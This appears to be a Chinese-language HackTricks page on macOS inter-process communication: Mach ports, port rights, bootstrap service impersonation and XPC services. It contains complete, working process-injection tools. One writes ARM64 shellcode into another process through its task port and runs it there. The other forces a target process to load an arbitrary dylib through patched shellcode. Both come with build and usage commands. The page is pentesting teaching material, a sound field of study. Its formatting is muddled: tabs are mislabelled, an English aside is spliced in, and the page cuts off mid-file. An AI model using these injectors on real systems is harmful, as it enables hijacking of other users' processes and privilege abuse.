# macOS IPC - 进程间通信

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 通过端口进行Mach消息传递

Mach使用**任务（task）**作为共享资源的**最小单位**，每个任务可以包含**多个线程**。这些**任务和线程与POSIX进程和线程一一对应**。

任务之间的通信通过Mach进程间通信（IPC）进行，利用单向通信通道。**消息通过端口进行传输**，端口类似于由内核管理的**消息队列**。

端口权限定义了任务可以执行的操作，这对通信至关重要。可能的**端口权限**有：

* **接收权限**，允许接收发送到端口的消息。Mach端口是MPSC（多生产者，单消费者）队列，这意味着整个系统中可能只有**一个接收权限与每个端口**相关联（与管道不同，多个进程可以持有指向管道读端的文件描述符）。
* 具有**接收权限的任务**可以接收消息并**创建发送权限**，从而可以发送消息。最初，**只有自己的任务对其端口具有接收权限**。
* **发送权限**，允许向端口发送消息。
* **一次性发送权限**，允许向端口发送一条消息，然后消失。
* **端口集权限**，表示一个**端口集**而不是单个端口。从端口集中出队一条消息会从其中一个包含的端口中出队。端口集可用于同时监听多个端口，类似于Unix中的`select`/`poll`/`epoll`/`kqueue`。
* **死名称**，不是实际的端口权限，而只是一个占位符。当一个端口被销毁时，所有现有的端口权限都变成死名称。

**任务可以将发送权限传输给其他任务**，使其能够发送消息回来。**发送权限也可以被克隆，因此一个任务可以复制并将权限给第三个任务**。这与一个称为**引导服务器**的中间进程结合使用，可以实现任务之间的有效通信。

#### 步骤：

正如前面提到的，为了建立通信通道，涉及到**引导服务器**（mac中的**launchd**）。

1. 任务**A**初始化一个**新的端口**，在此过程中获得一个**接收权限**。
2. 作为接收权限的持有者，任务**A**为端口**生成一个发送权限**。
3. 任务**A**通过引导注册过程与**引导服务器**建立**连接**，提供**端口的服务名称**和**发送权限**。
4. 任务**B**与**引导服务器**交互，执行服务名称的引导**查找**。如果成功，**服务器复制从任务A接收到的发送权限**，并将其**传输给任务B**。
5. 获得发送权限后，任务**B**能够**构建**一条**消息**并将其**发送给任务A**。

引导服务器**无法对任务声称的服务名称进行身份验证**。这意味着一个任务有可能**冒充任何系统任务**，例如虚假地**声称授权服务名称**，然后批准每个请求。

然后，Apple将**系统提供的服务名称**存储在位于**SIP保护**目录下的安全配置文件中：`/System/Library/LaunchDaemons`和`/System/Library/LaunchAgents`。对于每个服务名称，还存储了**关联的二进制文件**。引导服务器将为这些预定义服务**创建并持有每个服务名称的接收权限**。

对于这些预定义服务，**查找过程稍有不同**。当查找服务名称时，launchd会动态启动服务。新的工作流程如下：

* 任务**B**启动服务名称的引导**查找**。
* **launchd**检查任务是否正在运行，如果没有，则**启动**它。
* 任务**A**（服务）执行引导**签入**。在这里，引导服务器创建一个发送权限，保留它，并**将接收权限传输给任务A**。
* launchd复制**发送权限并将其发送给任务B**。

然而，这个过程仅适用于预定义的系统任务。非系统任务仍然按照最初的描述进行操作，这可能导致冒充。
### 代码示例

请注意，**发送方**在分配一个端口后，为名称`org.darlinghq.example`创建了一个**发送权限**，并将其发送到**引导服务器**，而发送方则请求该名称的**发送权限**并使用它来**发送消息**。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% tab title="sender.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/message.h>

#define BUFFER_SIZE 1024

int main(int argc, char** argv) {
    mach_port_t server_port;
    kern_return_t kr;
    char buffer[BUFFER_SIZE];

    // Connect to the server port
    kr = task_get_special_port(mach_task_self(), TASK_AUDIT_PORT, &server_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get server port: %s\n", mach_error_string(kr));
        return 1;
    }

    // Create a message
    mach_msg_header_t* msg = (mach_msg_header_t*)buffer;
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->msgh_size = sizeof(buffer);
    msg->msgh_remote_port = server_port;
    msg->msgh_local_port = MACH_PORT_NULL;
    msg->msgh_reserved = 0;

    // Send the message
    kr = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("Message sent successfully\n");

    return 0;
}
```

{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### 特权端口

* **主机端口**：如果一个进程对该端口具有**发送**权限，他可以获取关于系统的**信息**（例如`host_processor_info`）。
* **主机特权端口**：具有对该端口的**发送**权限的进程可以执行**特权操作**，如加载内核扩展。该进程需要是**root**才能获得此权限。
* 此外，为了调用**`kext_request`** API，需要具有**`com.apple.private.kext`**的授权，该授权仅提供给Apple二进制文件。
* **任务名称端口**：_任务端口_的非特权版本。它引用了任务，但不允许对其进行控制。似乎唯一可以通过它获得的是`task_info()`。
* **任务端口**（又名内核端口）：对该端口具有发送权限，可以控制任务（读/写内存，创建线程等）。
* 调用`mach_task_self()`以获取调用者任务的名称。此端口仅在**`exec()`**期间**继承**；使用`fork()`创建的新任务会获得一个新的任务端口（作为特殊情况，任务在`exec()`一个suid二进制文件后也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行`fork()`时执行["端口交换舞蹈"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)。
* 这些是访问端口的限制（来自二进制文件`AppleMobileFileIntegrity`的`macos_task_policy`）：
* 如果应用具有**`com.apple.security.get-task-allow`授权**，来自**同一用户的进程可以访问任务端口**（通常由Xcode用于调试）。**公证**过程不允许将其用于生产版本。
* 具有**`com.apple.system-task-ports`授权**的应用可以获取任何进程的**任务端口**，除了内核。在旧版本中，它被称为**`task_for_pid-allow`**。这仅授予Apple应用程序。
* **Root可以访问未使用强化运行时编译**的应用程序的任务端口（而且不是来自Apple）。

### 通过任务端口注入Shellcode

您可以从以下位置获取Shellcode：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
[NSThread sleepForTimeInterval:99999];
}
return 0;
}
```
{% tab title="entitlements.plist" %}

## entitlements.plist

The `entitlements.plist` file is a property list file used in macOS to specify the entitlements of an application. Entitlements are a set of privileges and permissions that determine what actions an application can perform on the system.

The `entitlements.plist` file contains a list of key-value pairs that define the entitlements for an application. Each key represents a specific entitlement, and the corresponding value specifies the level of access or permission granted to the application.

Some common entitlements include:

- `com.apple.security.app-sandbox`: Specifies whether the application is sandboxed, which restricts its access to certain system resources.
- `com.apple.security.network.client`: Grants the application permission to make network connections.
- `com.apple.security.files.user-selected.read-write`: Allows the application to read and write files selected by the user.
- `com.apple.security.device.usb`: Enables the application to interact with USB devices.

To modify the entitlements of an application, you can edit the `entitlements.plist` file using a text editor or the `codesign` command-line tool. However, keep in mind that modifying entitlements may have security implications and should be done carefully.

It's important to note that entitlements are checked by the system at runtime, so modifying the `entitlements.plist` file alone may not be sufficient to bypass security restrictions. Other security mechanisms, such as code signing and sandboxing, may also be in place to prevent unauthorized access.

For more information on entitlements and how to use them, refer to the Apple Developer documentation.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**编译**之前的程序，并添加**entitlements**以便能够使用相同的用户注入代码（如果不是，则需要使用**sudo**）。

<details>

<summary>injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid>", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pid-of-mysleep>
```
### 通过任务端口进行Dylib进程注入

在macOS中，线程可以通过Mach或使用posix `pthread` api进行操作。我们在前面的注入中生成的线程是使用Mach api生成的，因此它不符合posix规范。

我们可以注入一个简单的shellcode来执行命令，因为它不需要使用符合posix规范的api，只需要使用Mach。更复杂的注入需要线程也符合posix规范。

因此，为了改进shellcode，它应该调用`pthread_create_from_mach_thread`来创建一个有效的pthread。然后，这个新的pthread可以调用dlopen从系统中加载我们的dylib。

你可以在（例如生成日志然后可以监听它的示例dylibs）中找到示例dylibs：

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}
```c
if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
    memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
    printf("从 mach 线程创建 Pthread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
    printf("DLOpen @%llx\n", addrOfDlopen);
    memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
    strcpy(possiblePatchLocation, lib);
}
}

// 将 shellcode 写入分配的内存
kr = mach_vm_write(remoteTask,                   // 任务端口
                   remoteCode64,                 // 虚拟地址（目标）
                   (vm_address_t) injectedCode,  // 源
                   0xa9);                       // 源的长度

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "无法写入远程线程内存：错误 %s\n", mach_error_string(kr));
    return (-3);
}

// 设置分配的代码内存的权限
kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "无法设置远程线程代码的内存权限：错误 %s\n", mach_error_string(kr));
    return (-4);
}

// 设置分配的堆栈内存的权限
kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "无法设置远程线程堆栈的内存权限：错误 %s\n", mach_error_string(kr));
    return (-4);
}

// 创建线程来运行 shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

remoteStack64 += (STACK_SIZE / 2); // 这是真正的堆栈
//remoteStack64 -= 8;  // 需要 16 字节对齐

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf("远程堆栈 64  0x%llx，远程代码为 %p\n", remoteStack64, p);

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
                           (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);

if (kr != KERN_SUCCESS) {
    fprintf(stderr, "无法创建远程线程：错误 %s", mach_error_string(kr));
    return (-3);
}

return (0);
}

int main(int argc, const char * argv[])
{
if (argc < 3)
{
    fprintf(stderr, "用法：%s _pid_ _action_\n", argv[0]);
    fprintf(stderr, "   _action_：磁盘上 dylib 的路径\n");
    exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat(action, &buf);
if (rc == 0) inject(pid, action);
else
{
    fprintf(stderr, "找不到 dylib\n");
}
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 通过任务端口进行线程注入 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 基本信息

XPC代表XNU（macOS使用的内核）进程间通信，是macOS和iOS上进程之间通信的框架。XPC提供了一种在系统上不同进程之间进行安全、异步方法调用的机制。它是苹果安全范式的一部分，允许创建权限分离的应用程序，其中每个组件仅以执行其工作所需的权限运行，从而限制了受损进程可能造成的潜在损害。

XPC使用一种称为进程间通信（IPC）的方法，用于在同一系统上运行的不同程序之间发送数据。

XPC的主要优点包括：

1. **安全性**：通过将工作分离到不同的进程中，每个进程只能被授予其所需的权限。这意味着即使进程被入侵，它也只能有限地造成损害。
2. **稳定性**：XPC帮助将崩溃隔离到发生崩溃的组件。如果一个进程崩溃，可以重新启动而不影响系统的其他部分。
3. **性能**：XPC允许轻松并发，因为不同的任务可以在不同的进程中同时运行。

唯一的**缺点**是将一个应用程序分成多个进程，通过XPC进行通信会**效率较低**。但在今天的系统中，这几乎不可察觉，而且好处更多。

例如，QuickTime Player中的一个使用XPC的组件负责视频解码。该组件专门设计用于执行计算任务，因此在发生漏洞时，它不会为攻击者提供任何有用的收益，如访问文件或网络。

### 应用程序特定的XPC服务

应用程序的XPC组件位于**应用程序本身内部**。例如，在Safari中，您可以在**`/Applications/Safari.app/Contents/XPCServices`**中找到它们。它们的扩展名为**`.xpc`**（例如**`com.apple.Safari.SandboxBroker.xpc`**），并且也是**bundles**，其中包含主二进制文件：`/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`

正如您可能想到的，**XPC组件将具有不同的授权和权限**，与其他XPC组件或主应用程序二进制文件不同。除非XPC服务在其**Info.plist**文件中将[**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession)设置为“True”。在这种情况下，XPC服务将在与调用它的应用程序相同的安全会话中运行。

XPC服务在需要时由**launchd**启动，并在所有任务完成后**关闭**以释放系统资源。**应用程序特定的XPC组件只能由应用程序使用**，从而降低了与潜在漏洞相关的风险。

### 系统范围的XPC服务

系统范围的XPC服务对所有用户都可访问。这些服务可以是launchd或Mach类型，需要在指定目录中的plist文件中进行**定义**，例如**`/System/Library/LaunchDaemons`**、**`/Library/LaunchDaemons`**、**`/System/Library/LaunchAgents`**或**`/Library/LaunchAgents`**。

这些plist文件将具有一个名为**`MachServices`**的键，其中包含服务的名称，以及一个名为**`Program`**的键，其中包含二进制文件的路径：
```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Program</key>
<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
<key>AbandonProcessGroup</key>
<true/>
<key>KeepAlive</key>
<true/>
<key>Label</key>
<string>com.jamf.management.daemon</string>
<key>MachServices</key>
<dict>
<key>com.jamf.management.daemon.aad</key>
<true/>
<key>com.jamf.management.daemon.agent</key>
<true/>
<key>com.jamf.management.daemon.binary</key>
<true/>
